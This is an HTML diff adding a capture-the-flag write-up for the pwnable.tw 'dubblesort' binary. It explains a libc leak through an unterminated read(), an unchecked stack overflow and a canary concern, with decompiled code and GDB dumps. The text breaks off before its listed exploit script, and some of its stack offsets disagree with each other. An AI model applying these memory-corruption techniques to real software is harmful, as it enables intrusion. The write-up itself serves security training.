@@ -1,0 +1,1110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>dubblesort | QA210 Pwnable.tw Writeups</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --fg-dim: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* ========== NAVBAR ========== */
+.navbar {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 1000;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex; align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800; font-size: 1.25rem;
+  color: var(--accent);
+  text-decoration: none;
+  letter-spacing: -0.5px;
+  margin-right: 2rem;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex; gap: 0.25rem;
+  list-style: none;
+}
+.nav-links a {
+  color: var(--fg-dim);
+  text-decoration: none;
+  padding: 0.5rem 1rem;
+  border-radius: 8px;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(56,189,248,0.08); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56,189,248,0.12);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex; align-items: center; gap: 1rem;
+}
+.nav-right a {
+  color: var(--fg-dim);
+  text-decoration: none;
+  font-size: 0.8rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--accent); }
+
+/* ========== LAYOUT ========== */
+.page-wrapper {
+  position: relative;
+  z-index: 1;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 80px 2rem 4rem;
+  display: grid;
+  grid-template-columns: 240px 1fr;
+  gap: 3rem;
+}
+
+/* ========== SIDEBAR TOC ========== */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  align-self: start;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+.toc-title {
+  font-size: 0.7rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  color: var(--fg-dim);
+  margin-bottom: 1rem;
+  padding-left: 0.75rem;
+}
+.toc-list {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+.toc-list a {
+  display: block;
+  color: var(--fg-dim);
+  text-decoration: none;
+  font-size: 0.82rem;
+  font-weight: 450;
+  padding: 6px 12px;
+  border-radius: 6px;
+  border-left: 2px solid transparent;
+  transition: all 0.2s;
+}
+.toc-list a:hover {
+  color: var(--fg);
+  background: rgba(56,189,248,0.06);
+}
+.toc-list a.active {
+  color: var(--accent);
+  border-left-color: var(--accent);
+  background: rgba(56,189,248,0.08);
+}
+.toc-sub {
+  list-style: none;
+  padding-left: 1rem;
+  display: flex;
+  flex-direction: column;
+  gap: 1px;
+}
+.toc-sub a {
+  font-size: 0.78rem;
+  font-weight: 400;
+  padding: 4px 12px;
+  opacity: 0.7;
+}
+.toc-sub a:hover { opacity: 1; }
+
+/* ========== MAIN CONTENT ========== */
+.main-content {
+  min-width: 0;
+}
+
+/* Breadcrumb */
+.breadcrumb {
+  display: flex; align-items: center; gap: 0.5rem;
+  font-size: 0.8rem;
+  color: var(--fg-dim);
+  margin-bottom: 2rem;
+}
+.breadcrumb a {
+  color: var(--fg-dim);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb a:hover { color: var(--accent); }
+.breadcrumb .sep { opacity: 0.4; }
+.breadcrumb .current { color: var(--accent); font-weight: 600; }
+
+/* Challenge Header */
+.challenge-header {
+  margin-bottom: 3rem;
+  padding-bottom: 2rem;
+  border-bottom: 1px solid var(--border);
+}
+.challenge-badge {
+  display: inline-flex; align-items: center; gap: 0.5rem;
+  background: rgba(56,189,248,0.1);
+  border: 1px solid rgba(56,189,248,0.2);
+  border-radius: 20px;
+  padding: 4px 14px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.challenge-badge .pts {
+  background: rgba(56,189,248,0.2);
+  border-radius: 12px;
+  padding: 1px 8px;
+  margin-left: 2px;
+}
+.challenge-header h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1px;
+  background: linear-gradient(135deg, var(--fg) 0%, var(--accent) 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  margin-bottom: 0.75rem;
+}
+.challenge-header .subtitle {
+  font-size: 1.05rem;
+  color: var(--fg-dim);
+  font-weight: 400;
+  max-width: 600px;
+}
+.challenge-meta {
+  display: flex; flex-wrap: wrap; gap: 0.75rem;
+  margin-top: 1.5rem;
+}
+.meta-tag {
+  display: inline-flex; align-items: center; gap: 0.4rem;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 6px 12px;
+  font-size: 0.78rem;
+  font-family: 'JetBrains Mono', monospace;
+  color: var(--fg-dim);
+}
+.meta-tag .label { color: var(--fg-dim); opacity: 0.6; font-weight: 400; }
+.meta-tag .value { color: var(--fg); font-weight: 500; }
+.meta-tag.on { border-color: rgba(74,222,128,0.3); }
+.meta-tag.on .value { color: var(--green); }
+.meta-tag.warn { border-color: rgba(251,191,36,0.3); }
+.meta-tag.warn .value { color: var(--yellow); }
+
+/* Section */
+.section {
+  margin-bottom: 3.5rem;
+  scroll-margin-top: 80px;
+}
+.section-header {
+  display: flex; align-items: center; gap: 0.75rem;
+  margin-bottom: 1.5rem;
+}
+.section-num {
+  display: flex; align-items: center; justify-content: center;
+  width: 36px; height: 36px;
+  border-radius: 10px;
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  color: var(--bg);
+  font-weight: 800;
+  font-size: 0.9rem;
+  flex-shrink: 0;
+}
+.section-header h2 {
+  font-size: 1.6rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+/* Card */
+.card {
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 1.5rem;
+  margin-bottom: 1.25rem;
+}
+.card-title {
+  font-size: 0.95rem;
+  font-weight: 700;
+  color: var(--accent);
+  margin-bottom: 1rem;
+  display: flex; align-items: center; gap: 0.5rem;
+}
+.card-title .icon { font-size: 1rem; opacity: 0.8; }
+
+/* Callout */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin-bottom: 1.25rem;
+  font-size: 0.9rem;
+  line-height: 1.65;
+  display: flex; gap: 0.75rem;
+}
+.callout-icon {
+  flex-shrink: 0;
+  font-size: 1.1rem;
+  margin-top: 1px;
+}
+.callout-info {
+  background: rgba(56,189,248,0.08);
+  border: 1px solid rgba(56,189,248,0.15);
+  color: var(--fg);
+}
+.callout-warn {
+  background: rgba(251,191,36,0.08);
+  border: 1px solid rgba(251,191,36,0.15);
+  color: var(--fg);
+}
+.callout-danger {
+  background: rgba(248,113,113,0.08);
+  border: 1px solid rgba(248,113,113,0.15);
+  color: var(--fg);
+}
+.callout-success {
+  background: rgba(74,222,128,0.08);
+  border: 1px solid rgba(74,222,128,0.15);
+  color: var(--fg);
+}
+.callout-key {
+  background: rgba(129,140,248,0.08);
+  border: 1px solid rgba(129,140,248,0.15);
+  color: var(--fg);
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+  border-radius: 10px !important;
+  background: #0d1117 !important;
+  border: 1px solid var(--border) !important;
+  margin: 1rem 0 1.25rem !important;
+  font-size: 0.82rem !important;
+  line-height: 1.6 !important;
+  padding: 1.25rem !important;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.82rem !important;
+}
+:not(pre) > code {
+  background: rgba(56,189,248,0.1);
+  border: 1px solid rgba(56,189,248,0.15);
+  border-radius: 4px;
+  padding: 1px 6px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.82rem;
+  color: var(--accent);
+}
+
+/* Inline label */
+.label-row {
+  display: flex; flex-wrap: wrap; gap: 0.5rem;
+  margin: 0.75rem 0;
+}
+.label {
+  display: inline-flex; align-items: center;
+  background: rgba(56,189,248,0.1);
+  border: 1px solid rgba(56,189,248,0.2);
+  border-radius: 6px;
+  padding: 2px 10px;
+  font-size: 0.75rem;
+  font-family: 'JetBrains Mono', monospace;
+  color: var(--accent);
+}
+.label.green { background: rgba(74,222,128,0.1); border-color: rgba(74,222,128,0.2); color: var(--green); }
+.label.red { background: rgba(248,113,113,0.1); border-color: rgba(248,113,113,0.2); color: var(--red); }
+.label.yellow { background: rgba(251,191,36,0.1); border-color: rgba(251,191,36,0.2); color: var(--yellow); }
+.label.purple { background: rgba(129,140,248,0.1); border-color: rgba(129,140,248,0.2); color: var(--accent2); }
+
+/* Stack diagram */
+.stack-diagram {
+  background: #0d1117;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.25rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  line-height: 1.8;
+  overflow-x: auto;
+  margin: 1rem 0 1.25rem;
+}
+.stack-row {
+  display: flex; align-items: center; gap: 0.5rem;
+  white-space: nowrap;
+}
+.stack-addr {
+  color: var(--fg-dim);
+  opacity: 0.6;
+  min-width: 90px;
+  text-align: right;
+}
+.stack-arrow { color: var(--accent); opacity: 0.5; }
+.stack-val { color: var(--fg); min-width: 100px; }
+.stack-desc { color: var(--fg-dim); opacity: 0.7; }
+.stack-row.highlight .stack-val { color: var(--accent); font-weight: 700; }
+.stack-row.canary .stack-val { color: var(--yellow); font-weight: 700; }
+.stack-row.ret .stack-val { color: var(--green); font-weight: 700; }
+.stack-row.overflow .stack-val { color: var(--red); font-weight: 700; }
+
+/* Table */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.85rem;
+  margin: 1rem 0;
+}
+.info-table th {
+  text-align: left;
+  padding: 8px 12px;
+  background: rgba(56,189,248,0.06);
+  border: 1px solid var(--border);
+  color: var(--accent);
+  font-weight: 600;
+  font-size: 0.78rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.info-table td {
+  padding: 8px 12px;
+  border: 1px solid var(--border);
+  color: var(--fg);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:hover td { background: rgba(56,189,248,0.03); }
+
+/* Step list */
+.step-list {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 0.75rem;
+  margin: 1rem 0;
+}
+.step-list li {
+  display: flex; gap: 0.75rem;
+  font-size: 0.9rem;
+  line-height: 1.6;
+}
+.step-num {
+  flex-shrink: 0;
+  width: 28px; height: 28px;
+  display: flex; align-items: center; justify-content: center;
+  border-radius: 8px;
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  color: var(--bg);
+  font-size: 0.75rem;
+  font-weight: 800;
+  margin-top: 1px;
+}
+
+/* Terminal output */
+.terminal-output {
+  background: #0d1117;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.25rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  line-height: 1.7;
+  color: var(--fg);
+  overflow-x: auto;
+  margin: 1rem 0;
+}
+.terminal-output .prompt { color: var(--green); }
+.terminal-output .cmd { color: var(--accent); }
+.terminal-output .output { color: var(--fg-dim); }
+.terminal-output .highlight { color: var(--yellow); font-weight: 600; }
+.terminal-output .flag { color: var(--green); font-weight: 700; }
+
+/* Paragraph spacing */
+p { margin-bottom: 1rem; font-size: 0.92rem; color: var(--fg); }
+p.muted { color: var(--fg-dim); }
+
+/* Responsive */
+@media (max-width: 900px) {
+  .page-wrapper {
+    grid-template-columns: 1fr;
+    padding: 70px 1rem 2rem;
+  }
+  .toc-sidebar { display: none; }
+  .challenge-header h1 { font-size: 2rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<canvas id="particles-canvas"></canvas>
+
+<!-- ========== NAVBAR ========== -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- ========== PAGE WRAPPER ========== -->
+<div class="page-wrapper">
+
+  <!-- ========== TOC SIDEBAR ========== -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#recon" data-section="recon">1. Reconnaissance</a>
+        <ul class="toc-sub">
+          <li><a href="#recon-file" data-section="recon">File Info</a></li>
+          <li><a href="#recon-checksec" data-section="recon">Checksec</a></li>
+          <li><a href="#recon-run" data-section="recon">Running the Binary</a></li>
+        </ul>
+      </li>
+      <li><a href="#static" data-section="static">2. Static Analysis</a>
+        <ul class="toc-sub">
+          <li><a href="#static-main" data-section="static">Decompiled main()</a></li>
+          <li><a href="#static-leak" data-section="static">Leak Vulnerability</a></li>
+          <li><a href="#static-overflow" data-section="static">Stack Buffer Overflow</a></li>
+        </ul>
+      </li>
+      <li><a href="#gdb" data-section="gdb">3. GDB Debugging</a>
+        <ul class="toc-sub">
+          <li><a href="#gdb-stack" data-section="gdb">Stack Layout</a></li>
+          <li><a href="#gdb-leak" data-section="gdb">Leak Offset Analysis</a></li>
+        </ul>
+      </li>
+      <li><a href="#strategy" data-section="strategy">4. Exploit Strategy</a>
+        <ul class="toc-sub">
+          <li><a href="#strategy-leak" data-section="strategy">Libc Leak via printf</a></li>
+          <li><a href="#strategy-canary" data-section="strategy">Canary Bypass with scanf</a></li>
+          <li><a href="#strategy-rop" data-section="strategy">ROP via Sort</a></li>
+        </ul>
+      </li>
+      <li><a href="#exploit" data-section="exploit">5. Pwn Script</a></li>
+      <li><a href="#results" data-section="results">6. Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- ========== MAIN CONTENT ========== -->
+  <main class="main-content">
+
+    <!-- Breadcrumb -->
+    <div class="breadcrumb">
+      <a href="/">Home</a>
+      <span class="sep">/</span>
+      <a href="/pwnable-tw/">Pwnable.tw</a>
+      <span class="sep">/</span>
+      <span class="current">dubblesort</span>
+    </div>
+
+    <!-- Challenge Header -->
+    <header class="challenge-header">
+      <div class="challenge-badge">
+        Pwnable.tw <span class="pts">200pts</span>
+      </div>
+      <h1>dubblesort</h1>
+      <p class="subtitle">A bubble sort program with all protections enabled &mdash; leak libc through uninitialized stack data, bypass canary via scanf failure, and exploit a stack buffer overflow to get a shell.</p>
+      <div class="challenge-meta">
+        <span class="meta-tag"><span class="label">Conn</span> <span class="value">nc chall.pwnable.tw 10101</span></span>
+        <span class="meta-tag"><span class="label">Arch</span> <span class="value">i386 (32-bit ELF)</span></span>
+        <span class="meta-tag on"><span class="label">RELRO</span> <span class="value">Full</span></span>
+        <span class="meta-tag on"><span class="label">Canary</span> <span class="value">Yes</span></span>
+        <span class="meta-tag on"><span class="label">NX</span> <span class="value">Yes</span></span>
+        <span class="meta-tag on"><span class="label">PIE</span> <span class="value">Yes</span></span>
+        <span class="meta-tag warn"><span class="label">FORTIFY</span> <span class="value">Yes</span></span>
+      </div>
+    </header>
+
+    <!-- ============================================================ -->
+    <!-- CHAPTER 1: RECONNAISSANCE                                    -->
+    <!-- ============================================================ -->
+    <section class="section" id="recon">
+      <div class="section-header">
+        <div class="section-num">1</div>
+        <h2>Reconnaissance</h2>
+      </div>
+
+      <h3 id="recon-file" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">File Information</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128196;</span> Basic File Analysis</div>
+        <pre><code class="language-bash">$ file dubblesort
+dubblesort: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
+dynamically linked, interpreter /lib/ld-linux.so.2,
+for GNU/Linux 2.6.24,
+BuildID[sha1]=3e3e2eb9fe8cf6b49f07941f95e667b7e9d5bb62, stripped</code></pre>
+        <p>The binary is a 32-bit stripped ELF &mdash; no symbol names available, so we'll rely on decompilation for analysis.</p>
+      </div>
+
+      <h3 id="recon-checksec" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Checksec</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128274;</span> Security Protections</div>
+        <pre><code class="language-bash">$ checksec dubblesort
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    FORTIFY:  Enabled</code></pre>
+        <div class="callout callout-danger">
+          <span class="callout-icon">&#9888;&#65039;</span>
+          <div><strong>Full house of protections!</strong> Every mitigation is enabled. We need a libc leak to defeat PIE + ASLR, and a canary bypass to exploit the stack overflow. No GOT overwrite (Full RELRO), no shellcode (NX), and FORTIFY adds buffer checks on some libc calls.</div>
+        </div>
+      </div>
+
+      <h3 id="recon-run" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Running the Binary</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#9654;&#65039;</span> First Interaction</div>
+        <div class="terminal-output">
+<span class="prompt">$</span> <span class="cmd">./dubblesort</span>
+<span class="output">What your name :</span> <span class="highlight">test</span>
+<span class="output">Hello test,How many numbers do you what to sort :</span> <span class="highlight">3</span>
+<span class="output">Enter the 1 number : </span> <span class="highlight">5</span>
+<span class="output">Enter the 2 number : </span> <span class="highlight">3</span>
+<span class="output">Enter the 3 number : </span> <span class="highlight">1</span>
+<span class="output">After sort :</span>
+1 3 5
+        </div>
+        <p>The program asks for a name, then a count, reads that many unsigned integers, sorts them with bubble sort, and prints the result. Simple enough &mdash; but let's see what's happening under the hood.</p>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- CHAPTER 2: STATIC ANALYSIS                                   -->
+    <!-- ============================================================ -->
+    <section class="section" id="static">
+      <div class="section-header">
+        <div class="section-num">2</div>
+        <h2>Static Analysis</h2>
+      </div>
+
+      <h3 id="static-main" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Decompiled main()</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128269;</span> IDA / Ghidra Decompile</div>
+        <pre><code class="language-c">int main() {
+    int n, idx;
+    unsigned int array[?];  // on stack, no bounds check
+    unsigned int v3;
+
+    init();  // sets up buffering, etc.
+
+    __printf_chk(1, "What your name :");
+    read(0, name, 0x40u);       // BUG: no null termination!
+
+    __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
+    // %s reads past name buffer -> LEAK stack data (libc addresses)
+
+    __isoc99_scanf("%u", &n);
+    v3 = n;
+
+    if (n) {
+        idx = 0;
+        do {
+            __printf_chk(1, "Enter the %d number : ");
+            fflush(stdout);
+            __isoc99_scanf("%u", &array[idx]);  // no return value check!
+            ++idx;
+        } while (n > idx);
+    }
+
+    sort(array, v3);  // bubble sort on our overflowed buffer
+    return 0;
+}</code></pre>
+      </div>
+
+      <h3 id="static-leak" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Leak Vulnerability</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128272;</span> Information Leak via <code>read()</code> + <code>__printf_chk</code></div>
+        <p>The program uses <code>read(0, name, 0x40)</code> to read the name. The critical difference from <code>scanf("%s")</code> or <code>fgets()</code> is that <code>read()</code> does <strong>not</strong> append a null terminator. When the name is subsequently printed with <code>__printf_chk(1, "Hello %s,...")</code>, the <code>%s</code> format specifier reads bytes until it hits a null byte &mdash; which means it will read past the end of the <code>name</code> buffer and leak whatever is adjacent on the stack.</p>
+        <div class="callout callout-key">
+          <span class="callout-icon">&#128161;</span>
+          <div><strong>Key Insight:</strong> In a fresh process, the stack above <code>name</code> contains residual data from libc initialization (e.g., <code>__libc_start_main</code> frame pointers). These are libc addresses. By sending a name that fills <code>name</code> up to (but not past) the last byte before a libc pointer, we can leak a libc address via <code>%s</code>.</div>
+        </div>
+        <p>The <code>name</code> buffer is 0x40 (64) bytes. If we send exactly 24 or 25 bytes of non-null data, <code>printf %s</code> will print our name, then continue reading into stack data that contains a libc address. The leaked bytes will include a libc pointer.</p>
+      </div>
+
+      <h3 id="static-overflow" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Stack Buffer Overflow</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128165;</span> No Bounds Check on Array Count</div>
+        <p>The program asks "How many numbers" and uses <code>scanf("%u", &n)</code> to read the count. There is <strong>no validation</strong> that <code>n</code> fits within the array bounds. The loop simply writes <code>n</code> unsigned integers into <code>array[]</code>, overflowing past the buffer, past the canary, and into the saved return address.</p>
+        <div class="callout callout-warn">
+          <span class="callout-icon">&#9888;&#65039;</span>
+          <div><strong>But wait &mdash; there's a canary!</strong> Overwriting the canary would trigger <code>__stack_chk_fail</code> and crash the program. We need a way to preserve the canary while still controlling the return address.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- CHAPTER 3: GDB DEBUGGING                                     -->
+    <!-- ============================================================ -->
+    <section class="section" id="gdb">
+      <div class="section-header">
+        <div class="section-num">3</div>
+        <h2>GDB Debugging</h2>
+      </div>
+
+      <h3 id="gdb-stack" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Stack Layout</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128450;</span> Stack Frame During Input</div>
+        <p>Using GDB with a PIE breakpoint, we examine the stack layout when <code>scanf</code> is writing values:</p>
+        <pre><code class="language-bash">gdb-peda$ x/50wx $esp+0x20
+0xffc8...20: 0x00000000  0x00000000  0x00000000  0x00000000   <- array[0..3]
+0xffc8...30: 0x00000000  0x00000000  0x00000000  0x00000000   <- array[4..7]
+0xffc8...40: 0x00000000  0x00000000  0x00000000  0x00000000   <- array[8..11]
+0xffc8...50: 0x5dca2c00                                  <- CANARY
+0xffc8...54: 0xf7...                                  <- saved EBP
+0xffc8...58: 0xf7...                                  <- return addr</code></pre>
+
+        <div class="stack-diagram">
+<div class="stack-row"><span class="stack-addr">esp+0x20</span><span class="stack-arrow">&rarr;</span><span class="stack-val">array[0]</span><span class="stack-desc">; user-controlled</span></div>
+<div class="stack-row"><span class="stack-addr">esp+0x24</span><span class="stack-arrow">&rarr;</span><span class="stack-val">array[1]</span><span class="stack-desc">; user-controlled</span></div>
+<div class="stack-row"><span class="stack-addr">...</span><span class="stack-arrow"></span><span class="stack-val">...</span><span class="stack-desc">; user-controlled (indices 0-11)</span></div>
+<div class="stack-row"><span class="stack-addr">esp+0x50</span><span class="stack-arrow">&rarr;</span><span class="stack-val">array[12]</span><span class="stack-desc">; overflows into canary region</span></div>
+<div class="stack-row canary"><span class="stack-addr">esp+0x54</span><span class="stack-arrow">&rarr;</span><span class="stack-val">CANARY</span><span class="stack-desc">; 0x5dca2c00 (LSB = 0x00 always)</span></div>
+<div class="stack-row"><span class="stack-addr">esp+0x58</span><span class="stack-arrow">&rarr;</span><span class="stack-val">saved EBP</span><span class="stack-desc">; overwritten</span></div>
+<div class="stack-row ret"><span class="stack-addr">esp+0x5C</span><span class="stack-arrow">&rarr;</span><span class="stack-val">return addr</span><span class="stack-desc">; overwritten -> system()</span></div>
+        </div>
+
+        <div class="callout callout-info">
+          <span class="callout-icon">&#8505;&#65039;</span>
+          <div><strong>Canary LSB = 0x00:</strong> In Linux (glibc), the stack canary's least significant byte is always <code>0x00</code>. This is a null byte, which naturally terminates <code>%s</code> reads. This property is crucial for both the leak and the bypass strategy.</div>
+        </div>
+      </div>
+
+      <h3 id="gdb-leak" style="font-size:1.1rem;font-weight:700;margin-bottom:0.75rem;color:var(--fg);">Leak Offset Analysis</h3>
+      <div class="card">
+        <div class="card-title"><span class="icon">&#128202;</span> Determining the Leak Offset</div>
+        <p>We send 25 bytes of <code>\x01</code> as the name. The <code>read()</code> call writes 25 bytes into <code>name</code> without null termination. Then <code>__printf_chk</code> with <code>%s</code> prints those 25 bytes plus whatever follows on the stack until it hits a null byte.</p>
+        <pre><code class="language-bash">gdb-peda$ x/20wx &name
+0xffc8...: 0x01010101  0x01010101  0x01010101  0x01010101  <- our input
+0xffc8...: 0x01010101  0x01010101  0x01010100  0x00000000  <- last byte 0x00
+0xffc8...: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffc8...: 0xf75aXXXX  0xf755XXXX                          <- libc pointers!</code></pre>
+        <p>The printf reads past our input and reaches libc pointers. The specific leaked value depends on what's on the stack. The leak value turns out to be at offset <code>0x1b0000</code> from the libc base:</p>
+        <table class="info-table">
+          <tr><th>Leaked Value</th><th>Libc Base Offset</th><th>Calculation</th></tr>
+          <tr><td><code>0xf7XXXXXX</code></td><td><code>0x1b0000</code></td><td><code>libc_base = leaked - 0x1b0000</code></td></tr>
+        </table>
